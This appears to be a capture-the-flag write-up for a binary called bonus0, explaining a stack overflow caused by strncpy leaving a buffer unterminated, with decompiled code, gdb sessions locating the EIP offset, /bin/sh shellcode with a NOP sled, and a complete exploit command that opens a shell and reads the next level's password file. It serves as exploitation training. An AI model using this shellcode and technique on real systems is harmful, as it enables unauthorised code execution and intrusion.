# Bonus0

We have an executable that waits for two inputs once launched.

```
$ ls
bonus0
$ ./bonus0
 -
test
 -
test
test test
```

Here is an overview of the code. via dogbolt.
</br>
<<https://dogbolt.org>>

```
void p(char *a0, char *a1)
{
    char v0;  // [bp-0x100c]

    puts(a1);
    read(0, &v0, 0x1000);
    *(strchr(&v0, 10)) = 0;
    strncpy(a0, &v0, 20);
    return;
}

void int operator++(char *ptr)
{
    char *v3;  // edi
    unsigned int result;  // [bp-0x40]
    char v1[20];  // [bp-0x34]
    char v2[20];  // [bp-0x20]

    p(&v1, " - ");
    p(&v2, " - ");
    strcpy(ptr, &v1);
    result = 4294967295;
    v3 = ptr;
    do
    {
        if (!result)
            break;
    } while (*(v3));
    *((unsigned short *)&ptr[1 + ~(result)]) = 32;
    strcat(ptr, &v2);
    return;
}

unsigned int main(void)
{
    char v0[42];  // [bp-0x2e]

    int operator++(&v0);
    puts(&v0);
    return 0;
}
```

``strncpy`` does not guarantee that the destination string will end with a "\0" if the source is 20 bytes or more. This is crucial for what follows.
</br>
We can therefore cause an overflow.

```
void p(char *a0, char *a1)
{
    char v0;							// [bp-0x100c] (4108 bytes)

    puts(a1);
    read(0, &v0, 0x1000);				// Reads 4096 bytes
    *(strchr(&v0, 10)) = 0;				// Replaces the first ‘\n’ with a NULL byte
    strncpy(a0, &v0, 20);				// Copy ONLY 20 bytes into a0
    return;
}
```

``v1`` and ``v2`` are two 20-byte buffers, side by side on the stack.
</br>
If we fill ``v1`` with 20 characters, there is no "\0".
</br>
``strcpy(ptr, &v1)`` will therefore copy the 20 bytes of v1 and continue reading what comes after until it finds a "\0".

```
void int operator++(char *ptr)
{
    char *v3;  // edi
    unsigned int result;  // [bp-0x40]
    char v1[20];  // [bp-0x34]
    char v2[20];  // [bp-0x20]

    p(&v1, " - ");
    p(&v2, " - ");
    strcpy(ptr, &v1);
    result = 4294967295;
    v3 = ptr;
    do
    {
        if (!result)
            break;
    } while (*(v3));
    *((unsigned short *)&ptr[1 + ~(result)]) = 32;
    strcat(ptr, &v2);
    return;
}
```

Now we're going to calculate the ``offset`` to overwrite ``eip``.
</br>
We will use this site to generate strings to find the offset.
</br>
<<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>>

```
$ gdb ./bonus0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

0x41336141 = A3aA
We crash on the 9th element of the chain. This means that EIP starts there, ``30 bytes to reach EIP`` (21 + 9).
Now we need the address of the large 4096 buffer, which is where we will put the shellcode.
This address is ``0xbfffe670``.

```
$ gdb ./bonus0
(gdb) disas p
Dump of assembler code for function p:
 ...
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax				//Buffer
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
 ...
End of assembler dump.
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484d0 in p ()
(gdb) p/x $ebp - 0x1008
$1 = 0xbfffe670
```

We will use the same shellcode as in level9.

```
"\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"
```

We will fill the beginning of the buffer with 100 "\x90" characters to allow overflow, but also because this symbol corresponds to the ``NOP (No-Operation)`` assembly instruction.
</br>
When the program encounters it, it will simply move on to ``the next instruction``.
</br>
And to avoid problems, since we have put 100 "\x90", we will go from ``0xbfffe670`` to ``0xbfffe6c0``.
</br>
Without forgetting to make sure that the second buffer is 20 characters long, to align the "\0".

```
$ (python -c 'print "\x90"*100 + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"'; python -c 'print "A"*9 + "\xc0\xe6\xff\xbf" + "A"*7'; cat) | ./bonus0
 -
 -
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
